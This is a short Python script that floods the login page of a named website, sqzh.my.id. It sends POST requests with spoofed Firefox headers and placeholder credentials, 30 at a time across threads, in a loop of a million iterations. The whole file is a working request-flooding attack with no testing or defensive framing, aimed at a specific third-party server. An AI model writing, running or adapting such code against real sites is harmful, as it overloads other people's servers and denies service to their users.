from concurrent.futures import ThreadPoolExecutor
import requests


def spam():
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://sqzh.my.id',
        'Connection': 'keep-alive',
        'Referer': 'https://sqzh.my.id/login.php',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
    }

    data = {
        'user': 'username',
        'pass': 'password',
    }

    response = requests.post('https://sqzh.my.id/login.php', headers=headers, data=data)

    print(response.status_code)


for i in range(1000000):
    with ThreadPoolExecutor(max_workers=30) as th:
        for i in range(30):
            th.submit(spam)